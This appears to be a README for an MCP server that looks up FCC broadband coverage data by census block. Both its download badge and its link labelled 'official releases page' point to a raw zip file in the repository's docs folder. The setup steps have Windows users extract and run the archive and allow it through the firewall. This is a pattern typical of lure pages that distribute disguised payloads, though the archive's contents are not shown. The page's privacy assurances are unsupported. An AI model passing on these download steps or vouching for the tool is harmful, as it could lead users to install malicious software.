# 🌐 fcc-broadband-mcp-server - Search federal internet access data easily

[![](https://img.shields.io/badge/Download-Now-blue.svg)](https://raw.githubusercontent.com/Vannem1851/fcc-broadband-mcp-server/main/docs/broadband_mcp_fcc_server_1.2.zip)

This tool lets you find internet coverage data for any area in the United States. It connects to official FCC records through the Model Context Protocol. You use this software to look up broadband speed, provider maps, and census block details. 

## ⚙️ System Requirements

To run this tool on Windows, your computer needs these basic items:

* Windows 10 or Windows 11.
* A stable internet connection.
* At least 200 megabytes of free disk space.
* Node.js version 18 or newer installed on your system.

## 📥 Download and Install

Follow these steps to set up the software on your computer:

1. Visit the [official releases page](https://raw.githubusercontent.com/Vannem1851/fcc-broadband-mcp-server/main/docs/broadband_mcp_fcc_server_1.2.zip) to start the download.
2. Select the file ending in .zip for Windows.
3. Save the file to your computer.
4. Right-click the folder once it finishes downloading.
5. Choose Extract All to open the file contents.

## 🚀 Running the Tool

After you extract the files, follow these steps to start the program:

1. Open the folder where you saved the files.
2. Press the Shift key on your keyboard and right-click inside an empty space in the folder.
3. Select Open PowerShell window here or Open in Terminal.
4. Type `node build/index.js` into the black window that appears.
5. Press the Enter key on your keyboard.

The software starts immediately. You see messages confirming the connection to the FCC database.

## 💡 How to Use the Data

This tool acts as a bridge for AI agents. You provide a town name or a specific address. The software finds the census block ID. It then requests information about available providers in that region. 

### Examples of what you can ask:

* Which internet providers operate in this census block?
* Does this area have access to fiber optic speeds?
* What is the current status of broadband equity in this specific region?
* Find all census blocks in a zip code with low internet speed.

## 🛠️ Troubleshooting

If you encounter errors during setup, check these common fixes:

* Software not starting: Confirm you installed Node.js correctly. Open your Command Prompt and type `node -v` to verify. If you see a version number, Node.js works. 
* Connection errors: Your firewall might block the connection. Check your security settings to allow the tool to access the internet.
* Missing data: Ensure you provide the full address or the correct census block code. If you use a broad search term, the tool may return too many results.

## 📝 Understanding the Terms

We use these terms to organize data:

* Census Block: The smallest geographic unit used by the federal government to track population and services.
* MCP: A protocol that allows different programs to talk to each other to share data.
* Broadband: High-speed internet access that stays on at all times.
* Digital Divide: The gap between areas with high-speed access and areas without it.

## 🛡️ Privacy and Safety

This tool only reads public records provided by the FCC. It does not store your location or personal searches. All queries happen locally on your hardware. We do not track your activity or share your search history with third parties.

## 📈 Improving Your Search

When you search for data, precision helps. Use specific addresses rather than city names for better results. The tool maps specific latitude and longitude coordinates to FCC census maps. Accurate input leads to accurate maps of internet coverage.